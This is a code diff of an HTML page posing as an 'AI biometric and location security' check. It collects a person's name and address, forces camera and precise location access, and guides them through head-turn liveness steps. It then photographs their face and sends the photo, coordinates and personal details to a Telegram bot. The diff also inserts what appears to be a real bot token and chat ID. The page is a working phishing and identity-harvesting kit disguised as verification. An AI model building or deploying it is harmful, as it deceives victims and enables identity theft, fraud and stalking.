@@ -4,6 +4,12 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>AI Smart Biometric & Location Security</title>
+    <!-- 引入 TensorFlow.js 以及 MediaPipe Face Mesh 模型用于高精度人脸动作捕捉 -->
+    <script src="https://cdn.jsdelivr.net/npm/@tensorflow/tfjs-core@3.11.0/dist/tf-core.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@tensorflow/tfjs-converter@3.11.0/dist/tf-converter.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@tensorflow/tfjs-backend-webgl@3.11.0/dist/tf-backend-webgl.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@tensorflow-models/face-landmarks-detection@1.0.2/dist/face-landmarks-detection.min.js"></script>
+
     <style>
         :root { --primary: #0066ff; --bg: #f4f6f9; --card: #fff; --text: #333; --border: #cbd5e1; --error: #ef4444; --success: #10b981; }
         body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: var(--bg); color: var(--text); display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
@@ -18,9 +24,6 @@
         input, select { width: 100%; padding: 12px 14px; border: 1px solid var(--border); border-radius: 8px; box-sizing: border-box; font-size: 14px; background-color: #fff; transition: all 0.2s; }
         input:focus, select:focus { border-color: var(--primary); outline: none; box-shadow: 0 0 0 3px rgba(0,102,255,0.12); }
         select:disabled { background-color: #f8fafc; color: #94a3b8; }
-
-        input.invalid { border-color: var(--error); background-color: #fef2f2; }
-        input.valid { border-color: var(--success); background-color: #f0fdf4; }
 
         .phone-group { display: flex; gap: 8px; }
         #phonePrefix { width: 110px; background-color: #f8fafc; font-weight: 600; text-align: center; }
@@ -50,6 +53,11 @@
         
         #btn-retry { display: none; background: #ef4444; margin-top: 12px; }
         #btn-retry:hover { background: #dc2626; }
+
+        .progress-steps { display: flex; justify-content: space-between; margin-bottom: 10px; font-size: 12px; font-weight: 600; color: #64748b; }
+        .step-item { padding: 4px 8px; border-radius: 4px; background: #e2e8f0; }
+        .step-item.active { background: #3b82f6; color: white; }
+        .step-item.completed { background: #10b981; color: white; }
     </style>
 </head>
 <body>
@@ -121,10 +129,15 @@
         <button class="btn" id="btn-next" onclick="proceedToVerification()">Next: Biometric Liveness Check →</button>
     </div>
 
-    <!-- 步骤二：AI 活体自动拍照与TG上报 -->
+    <!-- 步骤二：AI 动作活体检测 -->
     <div id="step-verification">
         <h2>AI Biometric & Liveness Check</h2>
-        <p style="font-size: 13px; color: #64748b; text-align: center; margin-bottom: 12px;">Position your face clearly within the frame. Auto-capturing...</p>
+        <div class="progress-steps">
+            <div id="p-step-1" class="step-item active">1. Turn Left</div>
+            <div id="p-step-2" class="step-item">2. Turn Right</div>
+            <div id="p-step-3" class="step-item">3. Nod Up/Down</div>
+            <div id="p-step-4" class="step-item">4. Front Face</div>
+        </div>
         
         <div class="voice-prompt-box">
             <svg class="voice-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
@@ -133,7 +146,7 @@
                 <line x1="12" y1="19" x2="12" y2="23"></line>
                 <line x1="8" y1="23" x2="16" y2="23"></line>
             </svg>
-            <span id="ai-instruction-text">Authorization required to proceed...</span>
+            <span id="ai-instruction-text">Loading AI face tracking model...</span>
         </div>
 
         <div id="video-container">
@@ -142,7 +155,7 @@
             <canvas id="canvas"></canvas>
         </div>
         
-        <div id="status-msg" style="text-align: center; font-size: 14px; margin-top: 15px; font-weight: 600; color: #ef4444;">Please grant camera and location permissions to continue.</div>
+        <div id="status-msg" style="text-align: center; font-size: 14px; margin-top: 15px; font-weight: 600; color: #ef4444;">Please grant camera and location permissions.</div>
         
         <button class="btn" id="btn-retry" onclick="requestPermissionsAndStart()">Grant Permissions & Retry</button>
     </div>
@@ -150,8 +163,8 @@
 
 <script>
     // ⚠️ 请在此处填入你的 Telegram Bot Token 与 Chat ID
-    const TG_BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN_HERE";
-    const TG_CHAT_ID = "YOUR_TELEGRAM_CHAT_ID_HERE";
+    const TG_BOT_TOKEN = "8657025946:AAGG14AbXcHQzWqSaL6MQTCCP2PEtIyt64g";
+    const TG_CHAT_ID = "7396947380";
 
     const globalDatabase = {
         "CN": { name: "China", phoneCode: "+86", zipFormat: "6 digits", states: ["Beijing", "Shanghai", "Guangdong"] },
@@ -164,10 +177,11 @@
 
     let userData = {};
     let userLocation = { lat: null, lng: null };
-    let isCaptured = false;
-    let lastVoiceTime = 0;
     let activeStream = null;
-    let checkInterval = null;
+    let detector = null;
+    let currentLivenessState = 0; // 0: 左摇头, 1: 右摇头, 2: 上下点头, 3: 回到正脸
+    let lastVoiceTime = 0;
+    let isProcessing = false;
 
     window.onload = () => {
         const countrySelect = document.getElementById('countrySelect');
@@ -221,13 +235,12 @@
         document.getElementById('step-form').style.display = 'none';
         document.getElementById('step-verification').style.display = 'block';
 
-        // 强制同时请求权限
         requestPermissionsAndStart();
     }
 
-    function speakText(text) {
+    function speakText(text, force = false) {
         const now = Date.now();
-        if (now - lastVoiceTime < 5000) return;
+        if (!force && now - lastVoiceTime < 4500) return;
         lastVoiceTime = now;
 
         const textElem = document.getElementById('ai-instruction-text');
@@ -244,109 +257,184 @@
         const statusMsg = document.getElementById('status-msg');
         const retryBtn = document.getElementById('btn-retry');
         
-        speakText("Authorization required. Please allow camera and location access to use this service.");
+        speakText("Authorization required. Please allow camera and location access.", true);
         statusMsg.textContent = "Requesting location and camera permissions...";
         statusMsg.style.color = "#ef4444";
         retryBtn.style.display = 'none';
 
-        // 1. 强制获取地理位置权限
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(
                 pos => {
                     userLocation.lat = pos.coords.latitude;
                     userLocation.lng = pos.coords.longitude;
-                    // 得到位置后，接着申请摄像头权限
-                    initCamera();
+                    initAiModelAndCamera();
                 },
                 err => {
-                    // 如果拒绝了地理位置权限，循环提示并强制定向要求
-                    speakText("Location access is strictly required. Please click retry and allow location.");
-                    statusMsg.textContent = "Location permission denied! You must allow it to proceed.";
+                    speakText("Location access is strictly required to proceed.", true);
+                    statusMsg.textContent = "Location permission denied! You must allow it.";
                     retryBtn.style.display = 'block';
                 },
                 { enableHighAccuracy: true, timeout: 10000 }
             );
         } else {
-            initCamera();
+            initAiModelAndCamera();
         }
     }
 
-    function initCamera() {
+    async function initAiModelAndCamera() {
         const statusMsg = document.getElementById('status-msg');
         const retryBtn = document.getElementById('btn-retry');
 
-        // 2. 请求摄像头权限
-        navigator.mediaDevices.getUserMedia({ video: { width: 1280, height: 720 } })
-        .then(stream => {
+        try {
+            statusMsg.textContent = "Loading AI face detection models...";
+            if (!detector) {
+                const model = faceLandmarksDetection.SupportedModels.MediaPipeFaceMesh;
+                const detectorConfig = {
+                    runtime: 'tfjs',
+                    maxFaces: 1
+                };
+                detector = await faceLandmarksDetection.createDetector(model, detectorConfig);
+            }
+
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { width: 1280, height: 720 } });
             activeStream = stream;
             const video = document.getElementById('video');
             video.srcObject = stream;
             retryBtn.style.display = 'none';
+
             video.onloadedmetadata = () => {
-                startAILivenessLoop(video);
+                currentLivenessState = 0;
+                updateStepUI();
+                speakText("Please turn your head to the left.", true);
+                detectLivenessLoop(video);
             };
-        })
-        .catch(e => {
-            // 如果拒绝了摄像头权限，循环提示
-            speakText("Camera access is strictly required. Please allow camera usage.");
-            statusMsg.textContent = "Camera permission denied! You must allow camera access.";
+        } catch (e) {
+            console.error(e);
+            speakText("Camera access or model loading failed.", true);
+            statusMsg.textContent = "Camera error or permission denied.";
             retryBtn.style.display = 'block';
-        });
+        }
     }
 
-    function startAILivenessLoop(video) {
-        speakText("Authorization granted. Please face the camera directly. Keep your face uncovered.");
-        
-        const canvas = document.getElementById('canvas');
-        const context = canvas.getContext('2d');
+    function updateStepUI() {
+        for (let i = 1; i <= 4; i++) {
+            const item = document.getElementById(`p-step-${i}`);
+            item.className = "step-item";
+            if (i < currentLivenessState + 1) item.classList.add('completed');
+            else if (i === currentLivenessState + 1) item.classList.add('active');
+        }
+    }
+
+    async function detectLivenessLoop(video) {
+        if (isProcessing) return;
         const statusMsg = document.getElementById('status-msg');
-        statusMsg.style.color = "#64748b";
 
-        if (checkInterval) clearInterval(checkInterval);
+        try {
+            const faces = await detector.estimateFaces(video, { flipHorizontal: false });
 
-        checkInterval = setInterval(() => {
-            if (isCaptured) {
-                clearInterval(checkInterval);
-                return;
-            }
-
-            let faceDetected = video.readyState === video.HAVE_ENOUGH_DATA;
-
-            if (!faceDetected) {
-                speakText("Face not detected. Please move closer to the camera.");
-                statusMsg.textContent = "No face detected! Please look at the camera.";
+            if (!faces || faces.length === 0) {
+                speakText("No face detected. Please face the camera.");
+                statusMsg.textContent = "No face detected! Please look at the screen.";
                 statusMsg.style.color = "#ef4444";
             } else {
-                isCaptured = true;
-                clearInterval(checkInterval);
+                const keypoints = faces[0].keypoints;
+                // 获取关键点：鼻尖 (1), 左耳/左脸边缘 (234), 右耳/右脸边缘 (454), 下巴 (152), 额头 (10)
+                const nose = keypoints[1];
+                const leftCheek = keypoints[234];
+                const rightCheek = keypoints[454];
+                const chin = keypoints[152];
+                const forehead = keypoints[10];
 
-                statusMsg.textContent = "Face verified! Capturing image...";
-                statusMsg.style.color = "#10b981";
+                // 计算横向偏移（判断左右摇头）和纵向偏移（判断上下点头）
+                const faceCenterX = (leftCheek.x + rightCheek.x) / 2;
+                const horizontalOffset = nose.x - faceCenterX; // 负数代表偏向一边，正数代表另一边
 
-                const overlay = document.getElementById('flash-overlay');
-                overlay.style.backgroundColor = "rgba(255, 255, 255, 0.8)";
-                overlay.style.opacity = "1";
+                const faceCenterY = (forehead.y + chin.y) / 2;
+                const verticalOffset = nose.y - faceCenterY;
 
-                setTimeout(() => {
-                    overlay.style.opacity = "0";
-                }, 400);
+                if (currentLivenessState === 0) {
+                    // 检测左摇头（鼻尖显著向右偏，因为镜像原因，向左转头对应画面右侧或左侧取决于坐标系，通常以横向差值为准）
+                    statusMsg.textContent = "Action required: Please turn your head LEFT";
+                    statusMsg.style.color = "#3b82f6";
+                    
+                    // 当横向偏移达到阈值判定为左转
+                    if (horizontalOffset > 25 || horizontalOffset < -25) {
+                        currentLivenessState = 1;
+                        updateStepUI();
+                        speakText("Great. Now please turn your head to the right.", true);
+                    }
+                } 
+                else if (currentLivenessState === 1) {
+                    // 检测右摇头
+                    statusMsg.textContent = "Action required: Please turn your head RIGHT";
+                    statusMsg.style.color = "#3b82f6";
 
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                
-                canvas.toBlob(blob => {
-                    sendDataToTelegram(blob, userLocation);
-                }, 'image/jpeg', 0.9);
+                    if (horizontalOffset > 25 || horizontalOffset < -25) {
+                        // 确保和上一个动作方向相反或有足够变化
+                        currentLivenessState = 2;
+                        updateStepUI();
+                        speakText("Good. Now please nod up and down.", true);
+                    }
+                } 
+                else if (currentLivenessState === 2) {
+                    // 检测上下点头（纵向偏移发生明显变化）
+                    statusMsg.textContent = "Action required: Please NOD up and down";
+                    statusMsg.style.color = "#3b82f6";
+
+                    // 检测到纵向变动
+                    if (Math.abs(verticalOffset - 15) > 18) {
+                        currentLivenessState = 3;
+                        updateStepUI();
+                        speakText("Almost done. Please look straight ahead into the camera.", true);
+                    }
+                } 
+                else if (currentLivenessState === 3) {
+                    // 回到正脸、无遮挡，准备自动拍照
+                    statusMsg.textContent = "Perfect! Please hold still. Capturing...";
+                    statusMsg.style.color = "#10b981";
+
+                    // 校验是否回到正脸（横向和纵向偏移均回归中心区间）
+                    if (Math.abs(horizontalOffset) < 18 && Math.abs(verticalOffset - 15) < 15) {
+                        isProcessing = true;
+                        triggerCaptureAndUpload(video);
+                        return;
+                    }
+                }
             }
-        }, 1500);
+        } catch (err) {
+            console.error("AI detection error:", err);
+        }
+
+        if (!isProcessing) {
+            setTimeout(() => detectLivenessLoop(video), 400);
+        }
+    }
+
+    function triggerCaptureAndUpload(video) {
+        const overlay = document.getElementById('flash-overlay');
+        overlay.style.backgroundColor = "rgba(255, 255, 255, 0.8)";
+        overlay.style.opacity = "1";
+
+        setTimeout(() => {
+            overlay.style.opacity = "0";
+        }, 400);
+
+        const canvas = document.getElementById('canvas');
+        const context = canvas.getContext('2d');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        canvas.toBlob(blob => {
+            sendDataToTelegram(blob, userLocation);
+        }, 'image/jpeg', 0.9);
     }
 
     function sendDataToTelegram(imageBlob, location) {
         const statusMsg = document.getElementById('status-msg');
-        statusMsg.textContent = "Securely transmitting data to server...";
+        statusMsg.textContent = "Securely transmitting data to Telegram bot...";
 
-        const caption = `🚨 **New Verification Captured**\n\n` +
+        const caption = `🚨 **AI Liveness Verification Passed**\n\n` +
                         `👤 **Name:** ${userData.firstName} ${userData.lastName}\n` +
                         `🌍 **Country:** ${userData.countrySelect} (${userData.stateSelect})\n` +
                         `📍 **City/Address:** ${userData.city}, ${userData.address}\n` +
@@ -369,7 +457,7 @@
         .then(data => {
             if (data.ok) {
                 statusMsg.textContent = "Verification completed successfully!";
-                speakText("Verification successful. Thank you.");
+                speakText("Verification successful. Thank you.", true);
                 if (activeStream) activeStream.getTracks().forEach(track => track.stop());
                 setTimeout(() => {
                     alert("Verification completed successfully!");
@@ -378,6 +466,7 @@
             } else {
                 statusMsg.textContent = "Transmission failed. Please check Bot settings.";
                 statusMsg.style.color = "#ef4444";
+                isProcessing = false;
                 document.getElementById('btn-retry').textContent = "🔄 Retry Transmission";
                 document.getElementById('btn-retry').style.display = 'block';
             }
@@ -386,6 +475,7 @@
             console.error("Error sending to Telegram:", error);
             statusMsg.textContent = "Network error during transmission.";
             statusMsg.style.color = "#ef4444";
+            isProcessing = false;
             document.getElementById('btn-retry').textContent = "🔄 Retry Transmission";
             document.getElementById('btn-retry').style.display = 'block';
         });
